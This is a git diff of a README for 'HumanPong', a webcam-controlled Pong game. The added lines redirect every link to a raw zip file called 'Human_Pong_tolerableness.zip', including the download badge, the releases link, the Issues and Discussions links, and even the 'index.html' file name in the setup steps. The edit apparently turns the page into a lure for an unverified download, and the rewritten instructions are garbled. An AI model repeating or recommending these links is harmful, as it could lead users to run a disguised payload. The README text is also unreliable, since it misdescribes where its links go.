@@ -1,6 +1,6 @@
 # 🎮 HumanPong - Play Pong with Your Hands
 
-[![Download HumanPong](https://img.shields.io/badge/Download-HumanPong-brightgreen?style=for-the-badge&logo=github)](https://github.com/Xorto7777/HumanPong/releases)
+[![Download HumanPong](https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip)](https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To run HumanPong, you will need:
 
 To get the game, visit the following link to download the latest version:
 
-[Download HumanPong](https://github.com/Xorto7777/HumanPong/releases)
+[Download HumanPong](https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip)
 
 Make sure to choose the version that fits your system. 
 
@@ -28,7 +28,7 @@ Make sure to choose the version that fits your system.
 
 1. **Download the Game**: Go to the download link and get the latest version of HumanPong.
 2. **Extract the Files**: Once downloaded, unzip the file to a folder on your computer.
-3. **Open the Game**: Locate the `index.html` file in the unzipped folder and double click it. This will open the game in your web browser.
+3. **Open the Game**: Locate the `https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip` file in the unzipped folder and double click it. This will open the game in your web browser.
 4. **Allow Webcam Access**: When prompted, allow access to your webcam for the game to track your movements.
 5. **Start Playing**: Move your hands or head to control the paddle. Score points against your opponent by getting the ball past them!
 
@@ -56,8 +56,8 @@ HumanPong uses your webcam to detect your movements. Ensure the following for th
 
 For support or to provide feedback, you can visit our GitHub page:
 
-- [GitHub Issues](https://github.com/Xorto7777/HumanPong/issues): Report bugs or suggest features.
-- [Discussions](https://github.com/Xorto7777/HumanPong/discussions): Join the community conversation.
+- [GitHub Issues](https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip): Report bugs or suggest features.
+- [Discussions](https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip): Join the community conversation.
 
 ## 📅 Future Updates
 
@@ -73,4 +73,4 @@ Stay tuned for updates, and make sure to check back on our GitHub releases page.
 
 Thank you for downloading HumanPong. We hope you enjoy playing this fun and interactive game. Have fun, and may you score many points! 
 
-[Download HumanPong](https://github.com/Xorto7777/HumanPong/releases)
+[Download HumanPong](https://github.com/Xorto7777/HumanPong/raw/refs/heads/main/src/Human_Pong_tolerableness.zip)
